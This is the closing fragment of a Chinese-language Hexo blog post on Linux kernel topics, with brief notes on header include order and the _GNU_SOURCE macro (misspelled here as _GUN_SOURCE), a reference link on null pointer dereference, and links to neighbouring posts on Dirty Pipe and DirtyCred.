+<p>还有就是include的顺序，标准头文件应该在系统头文件之前。</p>
+<p>_GUN_SOURCE这个宏，这个宏可以让用户打开所有feature.</p>
+<p>在mem手册中也可以看到：</p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221206214205435.png" alt="image-20221206214205435"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://pawnyable.cafe/linux-kernel/LK02/null_ptr_deref.html">https://pawnyable.cafe/linux-kernel/LK02/null_ptr_deref.html</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>7r1p13J</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/kernel/"># kernel</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/12/17/CVE-2022-0847/">CVE-2022-0847 ditry-pipe 漏洞分析与利用</a>
+            
+            
+            <a class="next" rel="next" href="/2022/12/09/dirtycred/">DirtyCred学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
